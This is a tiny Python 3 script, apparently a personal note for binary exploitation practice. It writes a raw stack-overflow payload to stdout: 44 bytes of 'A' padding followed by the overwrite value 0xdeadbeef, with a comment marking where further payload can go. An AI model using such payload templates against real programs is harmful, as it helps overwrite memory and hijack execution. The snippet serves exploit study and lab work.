#!/usr/bin/python3
# more small snippets for binary exploitation
# printing payloads in python3 while avoiding UTF-8 encoding issues is a pain so I wrote it down

import sys
length = 44
hexString = b''

for i in range(length):
  hexString = hexString + b'\x41'

# can insert payload here after offset
hexString = hexString + b'\xef\xbe\xad\xde'

sys.stdout.buffer.write(hexString)
